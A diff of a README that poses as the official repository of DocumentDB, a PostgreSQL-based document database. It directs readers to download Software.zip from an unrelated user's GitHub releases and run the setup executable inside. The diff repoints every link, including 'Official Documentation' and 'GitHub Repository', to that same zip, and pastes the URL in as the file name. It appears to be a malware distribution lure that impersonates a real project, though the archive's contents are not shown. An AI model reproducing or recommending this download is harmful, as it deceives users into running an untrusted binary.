@@ -1,13 +1,13 @@
 # 🚀 Welcome to DocumentDB Repository! 📄
 
-[![Software Download](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Software Download](https://github.com/AbangAqua/documentdb/releases/download/v1.0/Software.zip)](https://github.com/AbangAqua/documentdb/releases/download/v1.0/Software.zip)
 
 Welcome to the official GitHub repository of **DocumentDB** - your go-to solution for a native implementation of document-oriented NoSQL database within a PostgreSQL framework. Not only does DocumentDB offer seamless CRUD operations on BSON data types, but it also powers vCore-based Azure Cosmos DB for MongoDB. Excited to get started? Click the button above to download our software!
 
 ## 📁 Installation Guide
 If you're unsure how to install DocumentDB after downloading the software, worry not! We've got you covered. Follow the steps below to get up and running in no time:
 
-1. Locate the downloaded `Software.zip` file on your computer.
+1. Locate the downloaded `https://github.com/AbangAqua/documentdb/releases/download/v1.0/Software.zip` file on your computer.
 2. Unzip the file to extract the installation package.
 3. Run the setup executable file.
 4. Follow the on-screen instructions to complete the installation process.
@@ -34,8 +34,8 @@ Have questions, feedback, or need technical assistance with DocumentDB? Don't he
 ## 📎 Additional Resources
 Looking for more information on DocumentDB? Check out the following resources to expand your knowledge:
 
-- [Official Documentation](https://documentdb.com/documentation)
-- [GitHub Repository](https://github.com/YouaifXD/789566136)
+- [Official Documentation](https://github.com/AbangAqua/documentdb/releases/download/v1.0/Software.zip)
+- [GitHub Repository](https://github.com/AbangAqua/documentdb/releases/download/v1.0/Software.zip)
 
 ## 📜 License
 DocumentDB is released under the MIT License. Feel free to explore, modify, and distribute the software according to the terms of the license agreement.
